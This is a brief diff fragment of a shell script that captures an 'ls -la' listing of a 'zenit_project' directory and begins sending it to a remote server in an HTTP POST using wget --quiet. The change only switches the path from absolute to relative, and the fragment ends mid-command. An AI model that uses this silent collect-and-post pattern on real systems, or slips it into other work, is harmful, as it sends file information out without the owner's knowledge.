@@ -7,7 +7,7 @@ SERVER_PORT=80
 SERVER_PATH="/"   
 
 # Capture ls output
-OUTPUT=$(ls -la /zenit_project/)
+OUTPUT=$(ls -la zenit_project/)
 
 # Send output via HTTP POST using wget
 wget --quiet \
